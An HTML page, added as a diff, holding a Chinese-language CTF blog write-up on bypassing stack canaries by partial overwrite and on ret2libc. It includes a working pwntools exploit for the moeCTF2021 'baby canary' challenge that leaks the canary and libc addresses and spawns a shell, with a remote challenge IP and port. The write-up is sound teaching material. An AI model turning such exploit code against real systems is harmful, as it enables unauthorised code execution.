@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>[PWN.0x01]canary|partial overwrite|ret2libc | zeroy&#39;s blog</title>
+<meta name="keywords" content="" />
+<meta name="description" content="canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。
+是否开启canary的编译选项：
+gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。
+如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。
+ret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。
+如果这两者都不显性存在，就可以使用ret2libc方法。
+这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。
+libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(&quot;/bin/sh&quot;) 来打开 shell。
+工作重心转向获取libc.so加载进内存的可利用的函数的地址。
+什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)
+深入理解GOT表和PLT表 - 知乎 (zhihu.com)
+got表和plt表在程序执行过程中的作用 - 云&#43;社区 - 腾讯云 (tencent.">
+<meta name="author" content="zeroy">
+<link rel="canonical" href="https://zeroy.site/articles/CTFpwn2/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css" integrity="sha256-yIlj/i15RiAA/Q&#43;xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://zeroy.site/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zeroy.site/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zeroy.site/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zeroy.site/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zeroy.site/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.0" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="[PWN.0x01]canary|partial overwrite|ret2libc" />
+<meta property="og:description" content="canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。
+是否开启canary的编译选项：
+gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。
+如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。
+ret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。
+如果这两者都不显性存在，就可以使用ret2libc方法。
+这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。
+libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(&quot;/bin/sh&quot;) 来打开 shell。
+工作重心转向获取libc.so加载进内存的可利用的函数的地址。
+什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)
+深入理解GOT表和PLT表 - 知乎 (zhihu.com)
+got表和plt表在程序执行过程中的作用 - 云&#43;社区 - 腾讯云 (tencent." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zeroy.site/articles/CTFpwn2/" /><meta property="article:section" content="articles" />
+<meta property="article:published_time" content="2022-03-05T20:30:31&#43;08:00" />
+<meta property="article:modified_time" content="2022-03-05T20:30:31&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[PWN.0x01]canary|partial overwrite|ret2libc"/>
+<meta name="twitter:description" content="canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。
+是否开启canary的编译选项：
+gcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。
+如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。
+ret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。
+如果这两者都不显性存在，就可以使用ret2libc方法。
+这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。
+libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(&quot;/bin/sh&quot;) 来打开 shell。
+工作重心转向获取libc.so加载进内存的可利用的函数的地址。
+什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)
+深入理解GOT表和PLT表 - 知乎 (zhihu.com)
+got表和plt表在程序执行过程中的作用 - 云&#43;社区 - 腾讯云 (tencent."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Articles",
+      "item": "https://zeroy.site/articles/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "[PWN.0x01]canary|partial overwrite|ret2libc",
+      "item": "https://zeroy.site/articles/CTFpwn2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[PWN.0x01]canary|partial overwrite|ret2libc",
+  "name": "[PWN.0x01]canary|partial overwrite|ret2libc",
+  "description": "canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。\n是否开启canary的编译选项：\ngcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。\n如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。\nret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。\n如果这两者都不显性存在，就可以使用ret2libc方法。\n这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。\nlibc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\u0026quot;/bin/sh\u0026quot;) 来打开 shell。\n工作重心转向获取libc.so加载进内存的可利用的函数的地址。\n什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)\n深入理解GOT表和PLT表 - 知乎 (zhihu.com)\ngot表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.",
+  "keywords": [
+    
+  ],
+  "articleBody": "canary绕过 什么是canary？ canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。\n是否开启canary的编译选项：\ngcc -o test test.c // 默认情况下，不开启Canary保护 gcc -fno-stack-protector -o test test.c //禁用栈保护 gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码 gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码 在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。\n如何绕过canary？ canary本身有个防意外输出的机制，由于printf %s函数以\\x00为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为\\x00，因此可以进行partial overwrite，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的\\x00覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。\nret2libc 概述 在较为基础的pwn题中一般都有一个显性的system函数和/bin/sh字符串供选手调用。\n如果这两者都不显性存在，就可以使用ret2libc方法。\n这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。\nlibc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(\"/bin/sh\") 来打开 shell。\n工作重心转向获取libc.so加载进内存的可利用的函数的地址。\n什么是动态链接？ 深入理解动态链接 - 简书 (jianshu.com)\n深入理解GOT表和PLT表 - 知乎 (zhihu.com)\ngot表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com)\n简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。\n而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。\n例题：moeCTF2021 - baby canary checksec后发现开了NX和canary保护。\ncanary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。\npayload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) 接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。\npayload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) #注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露 p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) 之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。\n完整exp：\nfrom pwn import * context(os=\"linux\",arch=\"amd64\",log_level=\"debug\") local=1 e=ELF(\"./baby_canary\") puts_got=e.got[\"puts\"] #指向got表的地址，got表具体的值要靠puts泄露 puts_plt=e.plt[\"puts\"] libc = ELF('/lib/i386-linux-gnu/libc.so.6') def main(): if local: p=process(\"./baby_canary\") else: p=remote(\"114.67.175.224\",11482) p.recv() payload1=b'a'*(0x4c-0x0c)+b'b' p.send(payload1) p.recvuntil(payload1) canary=u32(p.recv(3).rjust(4,b'\\x00')) p.recv() print(\"canary: \",hex(canary)) payload2=b'a'*(0x4c-0x0c)+p32(canary)+b'a'*12+p32(puts_plt)+p32(e.symbols[\"main\"])+p32(puts_got) p.send(payload2) p.recvuntil(\"he flag!\\n\") puts_addr=u32(p.recv(4)) print(puts_addr) libc_base = puts_addr - libc.sym['puts'] system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search(b'/bin/sh').__next__() p.recvuntil(\"u are?\\n\") p.send(payload1) payload3=b'a'*(0x4c-0xc)+p32(canary)+b'a'*12+p32(system_addr)+b'aaaa'+p32(binsh_addr) p.send(payload3) p.interactive() main() 小插曲 实践中发现，在函数调用栈中除了该有的局部变量，有时会出现一些奇怪的变量，这是由编译器决定的，一般用于存储寄存器上下文。\n",
+  "wordCount" : "154",
+  "inLanguage": "zh-cn",
+  "datePublished": "2022-03-05T20:30:31+08:00",
+  "dateModified": "2022-03-05T20:30:31+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "zeroy"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zeroy.site/articles/CTFpwn2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zeroy's blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zeroy.site/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zeroy.site/" accesskey="h" title="zeroy&#39;s blog (Alt + H)">zeroy&#39;s blog</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zeroy.site/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeroy.site/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeroy.site/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeroy.site/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeroy.site/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeroy.site/links/" title="友链">
+                    <span>友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://zeroy.site/">Home</a>&nbsp;»&nbsp;<a href="https://zeroy.site/articles/">Articles</a></div>
+    <h1 class="post-title">
+      [PWN.0x01]canary|partial overwrite|ret2libc
+    </h1>
+    <div class="post-meta"><span title='2022-03-05 20:30:31 +0800 CST'>March 5, 2022</span>&nbsp;·&nbsp;zeroy
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#canary%e7%bb%95%e8%bf%87" aria-label="canary绕过">canary绕过</a><ul>
+                        
+                <li>
+                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afcanary" aria-label="什么是canary？">什么是canary？</a></li>
+                <li>
+                    <a href="#%e5%a6%82%e4%bd%95%e7%bb%95%e8%bf%87canary" aria-label="如何绕过canary？">如何绕过canary？</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ret2libc" aria-label="ret2libc">ret2libc</a><ul>
+                        
+                <li>
+                    <a href="#%e6%a6%82%e8%bf%b0" aria-label="概述">概述</a></li>
+                <li>
+                    <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e5%8a%a8%e6%80%81%e9%93%be%e6%8e%a5" aria-label="什么是动态链接？">什么是动态链接？</a></li>
+                <li>
+                    <a href="#%e4%be%8b%e9%a2%98moectf2021---baby-canary" aria-label="例题：moeCTF2021 - baby canary">例题：moeCTF2021 - baby canary</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%b0%8f%e6%8f%92%e6%9b%b2" aria-label="小插曲">小插曲</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="canary绕过">canary绕过<a hidden class="anchor" aria-hidden="true" href="#canary绕过">#</a></h3>
+<h4 id="什么是canary">什么是canary？<a hidden class="anchor" aria-hidden="true" href="#什么是canary">#</a></h4>
+<p>canary是一种防止栈溢出的保护机制，可以在终端中使用checksec命令检查ELF文件是否开启了canary保护。</p>
+<p>是否开启canary的编译选项：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc -o test test.c // 默认情况下，不开启Canary保护
+gcc -fno-stack-protector -o test test.c //禁用栈保护
+gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
+gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
+</code></pre></div><p>在开启了canary的情况下，程序会在栈底额外存储一个值，并在函数return的时候检查这个值是否发生变动，从而判断程序是否发生了栈溢出，可以大大提高程序运行的安全性。</p>
+<p><img loading="lazy" src="1.svg" alt="1"  />
+</p>
+<h4 id="如何绕过canary">如何绕过canary？<a hidden class="anchor" aria-hidden="true" href="#如何绕过canary">#</a></h4>
+<p>canary本身有个防意外输出的机制，由于printf %s函数以<code>\x00</code>为输出结束的标志，因此为了防止canary下面的合法数据段被合法写入的情况下，canary被printf函数意外输出，所以在小端序程序中，canary的最低位字节一定为<code>\x00</code>，因此可以进行<strong>partial overwrite</strong>，即部分覆盖。在写完合法的区域之后，溢出写入一个字节的数据把canary末尾的<code>\x00</code>覆盖掉，这样之后的printf函数就会顺带着泄露canary的值。</p>
+<h3 id="ret2libc">ret2libc<a hidden class="anchor" aria-hidden="true" href="#ret2libc">#</a></h3>
+<h4 id="概述">概述<a hidden class="anchor" aria-hidden="true" href="#概述">#</a></h4>
+<p>在较为基础的pwn题中一般都有一个显性的<code>system</code>函数和<code>/bin/sh</code>字符串供选手调用。</p>
+<p>如果这两者都不显性存在，就可以使用ret2libc方法。</p>
+<p>这种方法主要针对**动态链接（dynamic linking）**的程序，程序运行时会调用 <strong>libc.so</strong> (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)。</p>
+<p><strong>libc.so</strong> 是 linux 下 C 语言库中的运行库<strong>glibc</strong> 的动态链接版，并且 <strong>libc</strong>.<strong>so</strong> 中包含了大量的可以利用的函数，包括 <strong>system() 、execve()</strong> 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 <strong>system(&quot;/bin/sh&quot;)</strong> 来打开 shell。</p>
+<p>工作重心转向获取libc.so加载进内存的可利用的函数的地址。</p>
+<h4 id="什么是动态链接">什么是动态链接？<a hidden class="anchor" aria-hidden="true" href="#什么是动态链接">#</a></h4>
+<p><a href="https://www.jianshu.com/p/cdb5cfcb5056">深入理解动态链接 - 简书 (jianshu.com)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/130271689">深入理解GOT表和PLT表 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1680494">got表和plt表在程序执行过程中的作用 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+<p>简而言之，装载到程序中的有两张表，对于一个外部库的被调用的函数，plt表指向got表中这个函数的位置，got表中则存储着这个函数在内存中的真实地址，函数的调用时通过plt表来完成的。</p>
+<p><img loading="lazy" src="2.svg" alt="2"  />
+</p>
+<p>而对于一个链接库（如libc.so）而言，虽然其加载进内存的具体地址不确定，但是其内部的各个函数的相对位置是确定的，也就是说，可以构造payload泄露libc.so中的一个函数的真实地址，从而根据固定的偏移获取system等函数的地址。</p>
+<h4 id="例题moectf2021---baby-canary">例题：moeCTF2021 - baby canary<a hidden class="anchor" aria-hidden="true" href="#例题moectf2021---baby-canary">#</a></h4>
+<p>checksec后发现开了NX和canary保护。</p>
+<p><img loading="lazy" src="lAEmSNwFPbVyfop.png" alt="lAEmSNwFPbVyfop"  />
+</p>
+<p>canary的绕过方法上面已有介绍，构造payload如下，借助第一个puts获取canary的值。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload1<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x4c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0c</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>
+p<span style="color:#f92672">.</span>send(payload1)
+p<span style="color:#f92672">.</span>recvuntil(payload1)
+canary<span style="color:#f92672">=</span>u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">3</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</code></pre></div><p>接下来要获取libc.so库中的某一函数的真实地址，不妨来获取puts函数的真实地址。构造payload使gots表中puts的值输出，获取到puts函数的真实地址，并使函数返回至main函数中，重新开始程序进行进一步攻击。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload2<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x4c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0c</span>)<span style="color:#f92672">+</span>p32(canary)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(puts_plt)<span style="color:#f92672">+</span>p32(e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])<span style="color:#f92672">+</span>p32(puts_got)
+<span style="color:#75715e">#注意上面的puts_got指的是地址，而真实的值是不固定的，需要被puts函数泄露</span>
+p<span style="color:#f92672">.</span>send(payload2)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;he flag!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+puts_addr<span style="color:#f92672">=</span>u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+</code></pre></div><p>之后根据已知的libc.so中puts函数和system，/bin/sh的便宜来获取system和/bin/sh的真实位置，从而构造payload攻击。</p>
+<p>完整exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux&#34;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>,log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;debug&#34;</span>)
+local<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+e<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./baby_canary&#34;</span>)
+puts_got<span style="color:#f92672">=</span>e<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>] <span style="color:#75715e">#指向got表的地址，got表具体的值要靠puts泄露</span>
+puts_plt<span style="color:#f92672">=</span>e<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>]
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">if</span> local:
+        p<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#34;./baby_canary&#34;</span>)
+    <span style="color:#66d9ef">else</span>:
+        p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;114.67.175.224&#34;</span>,<span style="color:#ae81ff">11482</span>)
+    p<span style="color:#f92672">.</span>recv()
+    payload1<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x4c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0c</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span>
+    p<span style="color:#f92672">.</span>send(payload1)
+    p<span style="color:#f92672">.</span>recvuntil(payload1)
